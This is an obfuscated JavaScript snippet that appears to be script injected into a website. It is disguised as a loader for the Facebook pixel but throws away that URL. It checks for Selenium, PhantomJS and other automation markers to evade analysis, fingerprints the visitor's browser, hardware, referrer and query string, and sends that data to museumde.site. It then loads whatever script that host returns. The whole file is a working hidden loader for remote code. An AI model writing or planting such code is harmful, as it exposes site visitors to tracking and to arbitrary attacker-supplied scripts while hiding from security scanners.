var HIEWFDORH = function (src) {
    var q = atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),
      e = encodeURIComponent,
      g = 0,
      w = window,
      d = w.document,
      n = w.navigator,
      de = "documentElement",
      s = w.screen,
      p = "",
      a = "avail",
      i = "inner",
      o = "outer",
      H = "Height",
      W = "Width",
      c = w.chrome ? Object.keys(w.chrome).join("*") : "*",
      tag = d.createElement("script");
  
    function wd() {
      try {
        for (var l in q) {
          var z = q[l];
          if (w[z] || n[z]) return z;
          if (d && d[de] && d[de].getAttribute && d[de].getAttribute(z)) return z;
          if (z in w || z in d) return z;
        }
        return 0;
      } catch {}
    }
  
    (function wp() {
      try {
        if (n && n.plugins) {
          Object.keys(n.plugins).forEach(function (i) {
            if (n.plugins[i]) p += n.plugins[i].filename + "*";
          });
        }
      } catch {}
    })();
  
    try {
      g = d.createElement("canvas")
        .getContext("webgl")
        .getParameter(
          g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL
        );
    } catch  {}
  
    src =
      "https://museumde.site/?clid=" +
      btoa(
        "ref=" +
          e(d.referrer) +
          "&drive=" +
          wd() +
          "&c=" +
          c +
          "&s=" +
          s[a + H] +
          "*" +
          w[i + H] +
          "*" +
          w[o + H] +
          "*" +
          s[a + W] +
          "*" +
          w[i + W] +
          "*" +
          w[o + W] +
          "*" +
          w.devicePixelRatio +
          "*" +
          n.maxTouchPoints +
          "&p=" +
          p +
          "&h=" +
          n.hardwareConcurrency +
          "*" +
          n.deviceMemory +
          "*" +
          e(g) +
          "&t=" +
          e(new Date().toString()) +
          "&q=" +
          e(w.location.search.substr(1))
      );
  
    tag.type = "text/javascript";
    tag.src = src;
    document.head.appendChild(tag);
  };
  
  HIEWFDORH("https://connect.facebook.net/en_US/fbevents.js");
  